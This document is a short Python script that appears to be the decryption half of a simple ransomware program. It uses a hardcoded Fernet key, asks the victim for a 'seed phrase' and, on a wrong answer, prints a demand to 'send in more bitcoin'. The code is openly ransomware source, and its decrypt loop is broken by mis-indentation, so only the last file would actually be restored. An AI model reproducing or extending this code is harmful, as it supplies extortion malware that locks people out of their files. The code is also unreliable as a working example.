#! /usr/bin/env

import os
from cryptography.fernet import Fernet

#find the files 
#loop over the files
#read and write per itearation
#using an imported module for the key Encrypt


files = []

for file in os.listdir():
    if file == "encryption.py" or file == "encryption_key.key":  
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)


key = b'6wg2FGXu0rpO_YLCMguy_qwOOoIlY8lnVrAopfGFxk8='

secret_key = Fernet(key)

seed_phrase = "COCKSUCKER"

pass_phrase = input("Kindly input the give seed phrase\n")

if seed_phrase == pass_phrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()

    decrypted_contents = secret_key.decrypt(contents)

    with open(file, "wb") as thefiles:
        thefiles.write(decrypted_contents)

    print("CONGRATULATIONS YOU JUST UNLOCKED YOUR SHIT")

else:
    print("WRONG SEED_PHRASE!!!?  Send in more bitcoin")
